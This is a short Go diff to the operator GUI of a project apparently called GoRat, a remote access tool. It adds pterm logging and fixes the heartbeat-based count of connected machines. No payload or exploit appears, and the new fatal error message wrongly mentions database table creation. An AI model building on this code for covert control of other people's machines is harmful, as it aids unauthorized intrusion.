@@ -4,8 +4,8 @@ import (
 	"fmt"
 	"time"
 
+	"github.com/pterm/pterm"
 	"github.com/NotKatsu/GoRat/modules/database"
-
 	"github.com/NotKatsu/GoRat/modules/gui/components"
 
 	go_rat "github.com/AllenDang/giu"
@@ -19,15 +19,16 @@ func connectedMachinesCount() int64 {
 		storedTime, err := time.Parse("2006-01-02 15:04:05.999999999-07:00", conn.LastHeartbeatTime)
 
 		if err != nil {
-			fmt.Println("Error parsing time:", err)
+			pterm.Fatal.WithFatal(true).Println("There was an error when the database tables were trying to be created.")
 		}
 		currentTime := time.Now()
 		timeDifference := currentTime.Sub(storedTime)
 
-		if timeDifference < 5 {
+		if timeDifference.Seconds() < 5 {
 			connectionCount += 1
 		}
 	}
+
 	return connectionCount
 }
 func MainWindow() {
